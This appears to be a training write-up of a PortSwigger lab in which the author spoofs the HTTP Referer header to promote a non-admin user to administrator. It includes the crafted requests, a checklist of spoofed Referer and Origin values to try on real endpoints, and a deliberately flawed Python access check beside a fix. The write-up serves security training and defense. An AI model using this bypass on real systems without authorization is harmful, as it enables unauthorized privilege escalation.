# PortSwigger Lab: Referer-Based Access Control

**Author:** Neelesh Pandey  
**Platform:** PortSwigger Web Security Academy  
**Difficulty:** Practitioner  
**Category:** Access Control / Privilege Escalation  
**Lab:** Referer-based access control  

---

## Overview

This lab demonstrates access control implemented using the HTTP `Referer` header — a header that indicates which page the request originated from. The application grants access to admin functionality only when the `Referer` header shows the request came from the admin panel. Since the `Referer` header is fully attacker-controlled, this provides no real security — any attacker can spoof it to bypass the check entirely.

---

## The Vulnerability

```
Without Referer header:
GET /admin-roles?username=carlos&action=upgrade
→ 401 Unauthorized

With spoofed Referer header:
GET /admin-roles?username=carlos&action=upgrade
Referer: https://site.com/admin
→ 200 OK — action executes
```

The server trusts the `Referer` header to verify the request originated from the admin panel. But `Referer` is sent by the client — it can be set to any value. It is not a security control.

---

## Methodology

```
Capture admin action → Test with non-admin session →
Identify Referer requirement → Spoof Referer →
Change username → Privilege escalation
```

---

## 1. Reconnaissance

### Step 1 — Capture Admin Request

Logged in as `administrator:admin`. Promoted `carlos` from the admin panel. Captured the request in Burp Repeater:

```http
GET /admin-roles?username=carlos&action=upgrade HTTP/2
Host: <lab-id>.web-security-academy.net
Cookie: session=<admin-session>
Referer: https://<lab-id>.web-security-academy.net/admin
```

**Key observation:** The request is a GET with parameters in the query string AND contains a `Referer` header pointing to `/admin`.

### Step 2 — Test Without Referer

Browsed directly to `/admin-roles?username=carlos&action=upgrade` with the non-admin session — no `Referer` header sent (direct navigation):

```http
GET /admin-roles?username=carlos&action=upgrade HTTP/2
Cookie: session=<wiener-session>
(no Referer header)
```

**Response:** `401 Unauthorized` — access denied without Referer header.

**Confirmed:** The access control check is based on the Referer header, not on actual authorisation.

---

## 2. Exploitation

### Step 3 — Replace Session and Username with Referer

Copied wiener's session into the existing Repeater request. Changed username to `wiener`. The `Referer` header from the original admin request is still present:

```http
GET /admin-roles?username=wiener&action=upgrade HTTP/2
Host: <lab-id>.web-security-academy.net
Cookie: session=<wiener-session>    ← non-admin session
Referer: https://<lab-id>.web-security-academy.net/admin    ← spoofed
```

### Step 4 — Replay

Sent from Burp Repeater.

**Response:** `200 OK` — wiener promoted to administrator. Lab solved.

---

## 3. Attack Flow Summary

```
Admin promotes carlos → GET /admin-roles + Referer:/admin captured
        ↓
Direct navigation without Referer → 401 Unauthorized
Referer header is the access control mechanism confirmed
        ↓
Replace admin session with wiener session
Keep Referer: /admin header (spoofed from original request)
Change username=wiener
        ↓
200 OK — Referer check passed — action executes
        ↓
Wiener promoted → lab solved
```

---

## 4. Why Referer-Based Access Control Fails

The `Referer` header is designed to tell servers where a request came from — useful for analytics and link tracking. It was never designed as a security mechanism because:

| Property | Why it Fails as Security |
|----------|-------------------------|
| Client-controlled | Any value can be set by the browser or tools like Burp |
| Not always sent | Browsers omit Referer in many scenarios (HTTPS→HTTP, private browsing) |
| No authentication | Knowing the URL of the admin panel is not proof of authorisation |
| Strippable | Proxies and privacy tools strip the Referer header |

**The check confirms the request "looks like" it came from the admin panel — not that the user IS an admin.**

---

## 5. Three Access Control Bypass Methods — Pattern Summary

| Lab | Flawed Control | Bypass |
|-----|---------------|--------|
| Method-based | Access control only on POST | Switch to GET method |
| Multi-step | Access control only on step 1 | Send final step directly |
| Referer-based | Trust Referer header | Spoof Referer to admin URL |

All three share the same root cause: the access control check relies on something the attacker controls.

---

## 6. Key Takeaways

- **Referer is not an authentication mechanism** — it is a navigation hint, not a security control; it can be set to any value by any HTTP client
- **Headers are attacker-controlled** — Host, Referer, X-Forwarded-For, X-Forwarded-Host, Origin — all can be spoofed; never use them as security controls
- **Knowing a URL is not proof of authorisation** — even if the attacker couldn't guess the admin URL, Referer-based control is still broken because it can be spoofed
- **Always test with custom Referer** — when a request is blocked, try adding `Referer: <site>/admin` or `Referer: <site>/admin-panel` to see if it bypasses the check
- **Direct navigation test reveals Referer dependency** — if browsing directly to a URL returns a different response than navigating via a link, the Referer header is involved in access control

---

## 7. Real-World Testing

When an endpoint returns 401/403, test:

```
Step 1: Try adding Referer pointing to admin URL
Referer: https://site.com/admin

Step 2: Try common admin paths
Referer: https://site.com/admin-panel
Referer: https://site.com/dashboard/admin
Referer: https://site.com/manage

Step 3: Try Origin header too
Origin: https://site.com

Step 4: Try both together
Referer: https://site.com/admin
Origin: https://site.com
```

---

## 8. Remediation

| Finding | Risk | Fix |
|---------|------|-----|
| Access control based on Referer | Critical | Use session-based authorisation — check if the authenticated user has admin role server-side |
| Client-supplied header trusted for security | Critical | Never trust any client-supplied header for authorisation decisions |
| No role check on admin endpoint | Critical | Implement server-side role validation on every admin endpoint |

**Secure implementation:**
```python
# WRONG — trusts Referer header
def admin_roles():
    referer = request.headers.get('Referer', '')
    if '/admin' not in referer:
        return 401
    execute_action()

# CORRECT — checks actual user role
@require_admin   # checks session for admin role
def admin_roles():
    execute_action()
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Burp Suite Professional | Proxy, Repeater |
| Private browser window | Separate non-admin session |

---

## References

- [PortSwigger — Access Control Vulnerabilities](https://portswigger.net/web-security/access-control)
- [MDN — Referer Header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer)
- [OWASP — Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)

---

*Write-up by Neelesh Pandey — [GitHub](https://github.com/Neelesh707) | [LinkedIn](https://www.linkedin.com/in/neelesh-pandey021/)*
